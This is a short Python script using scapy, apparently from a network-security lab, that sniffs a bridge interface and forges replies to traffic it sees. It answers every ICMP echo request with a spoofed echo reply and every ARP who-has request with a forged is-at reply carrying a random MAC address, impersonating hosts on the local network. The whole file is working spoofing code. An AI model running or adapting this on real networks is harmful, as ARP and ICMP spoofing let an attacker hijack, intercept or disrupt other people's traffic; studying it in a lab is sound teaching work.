#!/usr/bin/env python3
from scapy.all import *

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0

ARP_WHO_HAS = 1
ARP_IS_AT = 2

def random_mac():
    return "fa:fa:fa:%02x:%02x:%02x" % (
                             random.randint(0, 255),
                             random.randint(0, 255),
                             random.randint(0, 255))


def spoofing(pkt):
    # pkt.show()
    # print(pkt[ICMP].type)

    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == ICMP_ECHO_REQUEST:
            # print(pkt[IP].src)
            # print(pkt[ICMP].type)

            ethernet = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst, type = 0x0800) # IPV4 type
            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            icmp = ICMP(type=ICMP_ECHO_REPLY, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
            raw = Raw(load=pkt[Raw].load)

            print(f"Ping request from {pkt[IP].src} to {pkt[IP].dst}\nSending reply")
            
            packet = ethernet/ip/icmp/raw           
            sendp(packet, iface='br-973e506c5f0f')
            packet.show()
    
    elif pkt.haslayer(ARP):
        # pkt.show()
        # print(pkt[ARP].op)

        if pkt[ARP].op == ARP_WHO_HAS:
            ethernet = Ether()
            ethernet.dst = pkt[Ether].src
            ethernet.src = random_mac()
            ethernet.type = 0x0806 # ARP type

            arp = ARP()
            arp.hwsrc = ethernet.src
            arp.hwdst = ethernet.dst
            arp.psrc = pkt[ARP].pdst
            arp.pdst = pkt[ARP].psrc

            arp.hwlen = 6
            arp.plen = 4
            arp.op = ARP_IS_AT

            print(f"ARP request from {pkt[ARP].psrc} to {pkt[ARP].pdst}\nSending reply")

            # ethernet.show()
            # arp.show()

            sendp(ethernet/arp, iface='br-973e506c5f0f')


pkt_icmp = sniff(iface='br-973e506c5f0f:', filter='icmp || arp', prn=spoofing)